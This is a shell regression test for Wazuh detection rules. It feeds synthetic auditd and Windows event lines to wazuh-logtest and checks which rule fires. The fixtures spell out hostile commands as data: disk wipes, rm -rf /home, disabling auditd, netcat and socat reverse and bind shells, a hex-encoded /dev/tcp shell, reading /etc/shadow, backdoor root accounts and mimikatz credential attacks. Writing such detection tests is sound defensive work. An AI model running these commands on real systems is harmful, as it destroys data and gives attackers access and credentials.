#!/bin/sh
# Regression replay of the Aura-SOC detection rules (wazuh-logtest).
#
# Why this script: half of the level >= 12 rules describe a destructive
# action (disk wipe, rm -rf /home, snapshot destruction, stopping audit). We
# cannot validate them by running them on a test agent. So we replay
# synthetic auditd events against the manager's rule engine instead.
#
# The NON-destructive cases are ALSO validated on a real agent (see
# src/wazuh/DETECTION-REVIEW.md): this script does not replace the
# end-to-end test, it covers what the end-to-end test cannot do and serves
# as a regression safety net when editing a regex.
#
# Usage:  ./scripts/test-detection-rules.sh [manager_container_name]
#
# TWO TRAPS, both paid for in hours of debugging:
#  1. wazuh-logtest writes its result to STDERR. A `2>/dev/null` silently
#     fails 100% of the cases, including the negative controls - which looks
#     like "all my rules are broken" and is not.
#  2. wazuh-logtest reads ONE LINE = ONE LOG. In production the logcollector
#     aggregates SYSCALL + EXECVE + CWD + PATH + PROCTITLE into a single
#     multi-line event. So we concatenate SYSCALL and EXECVE onto a single
#     line. This is faithful for all the rules tested here, which anchor
#     their patterns inside the EXECVE line - but a rule that needed to
#     correlate TWO lines cannot be validated by this script.
set -u
CT="${1:-wazuh-wazuh.manager-1}"
ok=0; ko=0

# $1 description  $2 expected rule_id  $3 exe (comm inferred)  $4 EXECVE arguments
audit_case() {
  desc="$1"; want="$2"; exe="$3"; args="$4"
  # Shell expansion, NOT `basename "$exe"`: on the manager, auditd sees the
  # execve of basename with the path in argv, and our own rules match that
  # argv. Measured on 2026-08-01: a full replay produced 3 very real level 12
  # alerts (100769 on /usr/bin/nmap and /usr/bin/masscan, 100764 on
  # /usr/local/bin/chisel) - the detection test was detecting itself.
  comm=${exe##*/}
  log="type=SYSCALL msg=audit(1785132000.100:99001): arch=c000003e syscall=59 success=yes exit=0 items=3 ppid=100 pid=101 auid=1001 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm=\"$comm\" exe=\"$exe\" subj=unconfined key=\"audit-wazuh-c\" type=EXECVE msg=audit(1785132000.100:99001): $args"
  check "$desc" "$want" "$log"
}

# $1 description  $2 expected rule_id  $3 raw log line
raw_case() { check "$1" "$2" "$3"; }

check() {
  desc="$1"; want="$2"; log="$3"
  out=$(printf '%s\n' "$log" | docker exec -i "$CT" /var/ossec/bin/wazuh-logtest 2>&1 \
        | sed -n '/Phase 3/,$p')
  got=$(echo "$out" | grep -m1 -E "^[[:space:]]+id: '"    | sed "s/.*id: '\([0-9]*\)'.*/\1/")
  lvl=$(echo "$out" | grep -m1 -E "^[[:space:]]+level: '" | sed "s/.*level: '\([0-9]*\)'.*/\1/")
  if [ "$got" = "$want" ]; then
    ok=$((ok+1)); echo "OK   $desc -> $got (level $lvl)"
  else
    ko=$((ko+1)); echo "FAIL $desc -> expected $want, got ${got:-none} (level ${lvl:-0})"
  fi
}

echo "== Data / media destruction (T1485, T1561) =="
audit_case "100680 hdparm --security-erase" 100680 /usr/sbin/hdparm 'argc=4 a0="hdparm" a1="--user-master" a2="u" a3="--security-erase"'
audit_case "100680 nvme format"             100680 /usr/sbin/nvme   'argc=3 a0="nvme" a1="format" a2="/dev/nvme0n1"'
audit_case "100680 sgdisk --zap-all"        100680 /usr/sbin/sgdisk 'argc=3 a0="sgdisk" a1="--zap-all" a2="/dev/sda"'
audit_case "100680 cryptsetup luksErase"    100680 /usr/sbin/cryptsetup 'argc=3 a0="cryptsetup" a1="luksErase" a2="/dev/sda2"'
audit_case "100680 dd of=/dev/sda"          100680 /usr/bin/dd     'argc=3 a0="dd" a1="if=/dev/zero" a2="of=/dev/sda"'
audit_case "100680 wipefs -a"               100680 /usr/sbin/wipefs 'argc=3 a0="wipefs" a1="-a" a2="/dev/sdb"'
audit_case "100681 rm -rf /home"            100681 /usr/bin/rm     'argc=3 a0="rm" a1="-rf" a2="/home"'

echo "== Inhibit system recovery (T1490) =="
audit_case "100673 zfs destroy"             100673 /usr/sbin/zfs   'argc=3 a0="zfs" a1="destroy" a2="tank/backup"'
audit_case "100674 systemctl stop restic"   100674 /usr/bin/systemctl 'argc=3 a0="systemctl" a1="stop" a2="restic-backup.timer"'

echo "== Defense evasion (T1562.001 / T1562.004) =="
audit_case "100654 systemctl stop auditd"   100654 /usr/bin/systemctl 'argc=3 a0="systemctl" a1="stop" a2="auditd"'
# Reversed order + argv rewritten by the kernel (shebang script): the two
# traps that made the old version of 100654 bypassable.
audit_case "100654 service auditd stop"     100654 /usr/bin/dash   'argc=4 a0="/bin/sh" a1="/usr/sbin/service" a2="auditd" a3="stop"'
audit_case "100654 pkill -9 auditd"         100654 /usr/bin/pkill  'argc=3 a0="pkill" a1="-9" a2="auditd"'
audit_case "100654 auditctl -D"             100654 /usr/sbin/auditctl 'argc=2 a0="auditctl" a1="-D"'
audit_case "100654 auditctl -e 0"           100654 /usr/sbin/auditctl 'argc=3 a0="auditctl" a1="-e" a2="0"'
audit_case "100654 setenforce 0"            100654 /usr/sbin/setenforce 'argc=2 a0="setenforce" a1="0"'
audit_case "100645 nft flush ruleset"       100645 /usr/sbin/nft   'argc=3 a0="nft" a1="flush" a2="ruleset"'
audit_case "100645 ufw disable"             100645 /usr/bin/python3 'argc=3 a0="/usr/bin/python3" a1="/usr/sbin/ufw" a2="disable"'

echo "== Execution / privesc =="
audit_case "100656 chmod u+s"               100656 /usr/bin/chmod  'argc=3 a0="chmod" a1="u+s" a2="/tmp/x"'
audit_case "100650 /dev/tcp (hex)"          100650 /usr/bin/bash   'argc=3 a0="bash" a1="-c" a2="6261736820692F6465762F7463702F312E322E332E342F34343434"'
# Bind shell / listening socket (100659) - what 100651 misses for lack of a
# -e/-c option. An `nc -l 4444` on jellyfin on 2026-07-29 triggered nothing.
audit_case "100659 bind nc -l"              100659 /usr/bin/nc     'argc=3 a0="nc" a1="-l" a2="4444"'
audit_case "100659 bind nc -lvp"            100659 /usr/bin/nc     'argc=3 a0="nc" a1="-lvp" a2="4444"'
audit_case "100659 socat TCP-LISTEN EXEC"   100659 /usr/bin/socat  'argc=3 a0="socat" a1="TCP-LISTEN:4444,reuseaddr" a2="EXEC:/bin/bash"'
# Exclusivity check: the reverse shell with -e stays 100651, not 100659.
audit_case "100651 reverse nc -e"           100651 /usr/bin/nc     'argc=5 a0="nc" a1="10.0.0.1" a2="4444" a3="-e" a4="/bin/bash"'
audit_case "100653 sh -c cat /etc/shadow"   100653 /usr/bin/dash   'argc=3 a0="sh" a1="-c" a2="cat /etc/shadow"'
audit_case "100660 CVE in the binary"       100660 /usr/bin/python3 'argc=2 a0="python3" a1="CVE-2021-4034.py"'

echo "== Post-exploitation (pack 100760+) =="
# Cases not replayable on a test agent: nmap/masscan and Docker are not
# installed there. The rest of the pack is validated live on the agent.
audit_case "100769 nmap"                    100769 /usr/bin/nmap   'argc=4 a0="nmap" a1="-sS" a2="-p-" a3="10.0.0.0/24"'
audit_case "100769 masscan"                 100769 /usr/bin/masscan 'argc=3 a0="masscan" a1="-p80" a2="0.0.0.0/0"'
audit_case "100766 docker --privileged"     100766 /usr/bin/docker 'argc=5 a0="docker" a1="run" a2="--privileged" a3="-it" a4="alpine"'
audit_case "100766 nsenter -t 1"            100766 /usr/bin/nsenter 'argc=5 a0="nsenter" a1="-t" a2="1" a3="-m" a4="/bin/sh"'
audit_case "100764 ssh -R (reverse tunnel)" 100764 /usr/bin/ssh    'argc=4 a0="ssh" a1="-R" a2="9999:localhost:22" a3="attacker@1.2.3.4"'
audit_case "100764 chisel client"           100764 /usr/local/bin/chisel 'argc=3 a0="chisel" a1="client" a2="1.2.3.4:8080"'
audit_case "100762 useradd -o -u 0"         100762 /usr/sbin/useradd 'argc=5 a0="useradd" a1="-o" a2="-u" a3="0" a4="backdoor"'
audit_case "100761 usermod -aG sudo"        100761 /usr/sbin/usermod 'argc=4 a0="usermod" a1="-aG" a2="sudo" a3="pwned"'
audit_case "100768 setcap cap_setuid"       100768 /usr/sbin/setcap 'argc=3 a0="setcap" a1="cap_setuid+ep" a2="/usr/bin/python3"'
audit_case "100763 history -c (hex)"        100763 /usr/bin/bash   'argc=3 a0="bash" a1="-c" a2="686973746F7279202D63"'
# Negative control for the pack: a normal ssh must not pass for a tunnel.
audit_case "NEG ssh normal"                 80700  /usr/bin/ssh    'argc=2 a0="ssh" a1="serveur.interne"'

echo "== Fork bomb (kernel/shell messages, single line) =="
raw_case "100626 cgroup pids controller" 100626 "Jul 27 06:10:00 debian kernel: cgroup: fork rejected by pids controller in /user.slice/user-1001.slice"
raw_case "100626 shell form"             100626 "Jul 27 06:10:00 debian bash[123]: fork: retry: Resource temporarily unavailable"

echo "== Sensor self-monitoring =="
raw_case "100807 audit disabled (=0, HIGH)"  100807 "ossec: output: audit-status: audit_enabled=0 audit_rules=21"
raw_case "100801 auditd absent (=empty, MEDIUM)" 100801 "ossec: output: audit-status: audit_enabled= audit_rules=0"
raw_case "100802 rules purged"   100802 "ossec: output: audit-status: audit_enabled=1 audit_rules=0"
raw_case "100800 nominal state"  100800 "ossec: output: audit-status: audit_enabled=1 audit_rules=21"

echo "== AD / Windows: command line (purple-team campaign 2026-08-02) =="
# These cases lock in the campaign's lesson: four AD rules had been shipped
# without proof of firing, and none matched the real attack. 100921 required
# `vssadmin\s+create` whereas the 4688 event carries "vssadmin.exe  create
# shadow" (.exe suffix, two spaces). So we replay the EXACT command lines
# captured in the campaign's 4688 / Sysmon EID1 events, including their
# double spaces - that is precisely the form the rules had missed.
win_case() {
  desc="$1"; want="$2"; cmd="$3"; eid="${4:-1}"
  chan="Microsoft-Windows-Sysmon/Operational"
  [ "$eid" = "4688" ] && chan="Security"
  log="{\"win\":{\"system\":{\"channel\":\"$chan\",\"eventID\":\"$eid\",\"computer\":\"WIN-DC.lab.local\",\"providerName\":\"x\"},\"eventdata\":{\"commandLine\":\"$cmd\",\"image\":\"C:\\\\\\\\Temp\\\\\\\\t.exe\",\"processId\":\"4321\"}}}"
  check "$desc" "$want" "$log"
}

win_case "100921 vssadmin (forme reelle 4688)" 100921 "vssadmin.exe  create shadow /for=C:" 4688
win_case "100921 ntdsutil ifm"                 100921 "ntdsutil.exe \\\"ac i ntds\\\" ifm \\\"create full c:/temp\\\"" 4688
win_case "100921 reg save hklm sam"            100921 "reg.exe save hklm\\\\\\\\sam c:\\\\\\\\temp\\\\\\\\sam.hive" 4688
win_case "100924 mimikatz lsadump::dcsync"     100924 "mimikatz.exe \\\"lsadump::dcsync /domain:lab.local /user:krbtgt@lab.local\\\" \\\"exit\\\""
win_case "100924 mimikatz kerberos::golden"    100924 "mimikatz.exe \\\"kerberos::golden /domain:lab.local /sid:S-1-5-21-1 /krbtgt:aa\\\""
win_case "100924 mimikatz sekurlsa::pth"       100924 "mimikatz.exe \\\"sekurlsa::pth /user:Administrator /ntlm:cc36cf7a\\\""
win_case "100926 named tool without module"    100926 "cmd.exe /c echo %tmp%\\\\\\\\mimikatz\\\\\\\\x64\\\\\\\\mimikatz.exe"
win_case "100925 Invoke-Kerberoast"            100925 "powershell.exe -c Invoke-Kerberoast -OutputFormat Hashcat"
# ALSO satisfies 100926 (the word "rubeus"): verifies that the specific rule
# wins, i.e. that the declaration order in the file holds.
win_case "100925 Rubeus kerberoast"            100925 "Rubeus.exe kerberoast /outfile:h.txt"
win_case "100928 nltest /domain_trusts"        100928 "nltest.exe  /domain_trusts" 4688
win_case "100928 Get-ADTrust"                  100928 "powershell.exe -c Get-ADTrust -Filter *"
# Negative controls: everyday administration must trigger NO rule.
# We do not expect a fallback identifier: the synthetic event does not carry
# the fields (parent image, user) that the generic Windows rules need. What
# is tested here is the absence of a false positive from OUR rules.
win_case "NEG vssadmin list shadows"           "" "vssadmin.exe list shadows" 4688
win_case "NEG net use share"                   "" "net.exe use z: \\\\\\\\srv\\\\\\\\data" 4688
win_case "NEG dsquery user (routine recon)"    "" "dsquery.exe user -limit 10" 4688

echo "== Negative controls: must fall back to 80700 (level 0) =="
audit_case "NEG rm -rf /tmp/build"          80700 /usr/bin/rm     'argc=3 a0="rm" a1="-rf" a2="/tmp/build"'
audit_case "NEG systemctl restart apache2"  80700 /usr/bin/systemctl 'argc=3 a0="systemctl" a1="restart" a2="apache2"'
audit_case "NEG dd of=/home/u/img.iso"      80700 /usr/bin/dd     'argc=3 a0="dd" a1="if=/dev/zero" a2="of=/home/u/img.iso"'
audit_case "NEG apt-get install nginx"      80700 /usr/bin/apt-get 'argc=3 a0="apt-get" a1="install" a2="nginx"'
audit_case "NEG chmod 755"                  80700 /usr/bin/chmod  'argc=3 a0="chmod" a1="755" a2="/usr/local/bin/x"'
audit_case "NEG borg prune (retention)"     80700 /usr/bin/borg   'argc=3 a0="borg" a1="prune" a2="--keep-daily=7"'

echo
echo "Result: $ok OK, $ko FAIL"
[ "$ko" -eq 0 ]
